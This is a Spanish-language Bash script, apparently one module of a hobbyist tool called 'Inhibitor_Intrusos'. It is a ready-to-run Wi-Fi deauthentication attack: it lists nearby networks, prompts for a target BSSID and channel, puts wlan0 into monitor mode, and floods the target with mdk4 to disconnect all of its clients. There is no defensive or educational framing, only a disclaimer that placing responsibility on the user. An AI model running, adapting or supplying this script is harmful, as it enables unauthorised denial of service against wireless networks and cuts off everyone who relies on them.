#!/bin/bash

# Asegúrate de que estos paquetes estén instalados: aircrack-ng, mdk4, network-manager

# Establece la interfaz fija como wlan0
interfaz="wlan0"

clear
echo "   _____       _     _     _     _     _              _           "
echo "  |_   _|     (_)   | |   (_)   | |   (_)            (_)          "
echo "    | |   ___  _  __| |    _  __| |    _  ___   ___   _   ___ ___ "
echo "    | |  / _ \| |/ _\`|   | |/ _\`|   | |/ _ \ / __| | | / __/ _ \\"
echo "   _| |_| (_) | | (_| |   | | (_| |   | | (_) | (__  | || (_|  __/"
echo "  |_____|\___/|_|\__,_|   |_|\__,_|   |_|\___/ \___| |_| \___\___|"
echo "________________________________________________________________"
echo "                       Inhibitor_Intrusos"
echo "     ︻╦╤── Creado Por: Mr.Robot2006 v2.0  ︻╦╤──"
echo "-------------------------------------------------------------------------------------------"
echo " Cualquier acción y o actividad relacionada con Inhibitor es únicamente su responsabilidad"
echo "-------------------------------------------------------------------------------------------"
echo

echo "[7] Desconectar a todos los dispositivos de una Red Wifi"
echo
echo "[#] Copia el BSSID y CHAN del Wifi objetivo, puede tardar hasta 1 minuto en cargar"
echo

# Mostrar redes disponibles en una terminal aparte
sudo gnome-terminal --geometry 100x24+1300+20 -- bash -c "nmcli dev wifi list; sleep 99999999" &
sleep 3

read -p "[*] Copia el BSSID del Wifi Objetivo y pegalo a continuación: " bssid
read -p "[*] Copia el Canal (CHAN) del Wifi Objetivo y pegalo a continuación: " ch
sudo pkill gnome-terminal
sleep 1

# Activar modo monitor
echo "[*] Activando modo monitor en $interfaz..."
sudo ip link set $interfaz down
sudo iw dev $interfaz set type monitor
sudo ip link set $interfaz up
sleep 2

# Comienza ataque
clear
echo "[#] Pulse Ctrl + C (Para finalizar el ataque y todos los usuarios se reconecten al Wifi)"
echo
echo "========================================================================================="
echo "                    El Objetivo ($bssid) está siendo atacado"
echo "========================================================================================="
echo

sudo gnome-terminal --geometry 100x24+1300+20 -- bash -c "sudo airodump-ng -c $ch --bssid $bssid $interfaz; exec bash" &
sleep 2
sudo mdk4 $interfaz d -B $bssid -c $ch

sudo pkill gnome-terminal
echo

# Desactivar modo monitor
echo "[*] Restaurando interfaz $interfaz a modo managed..."
sudo ip link set $interfaz down
sudo iw dev $interfaz set type managed
sudo ip link set $interfaz up

echo
echo "#####################"
echo "[1] Volver al Menu"
echo "[2] Volver a ejecutar"
echo "[3] Salir"
echo "#####################"
echo

read -p "Elige una opción: " opc3
case $opc3 in
    1 ) bash inhibitor.sh ;;
    2 ) bash requisitos/7.sh ;;
    3 ) exit ;;
    * ) echo "No es una opción válida" ;;
esac
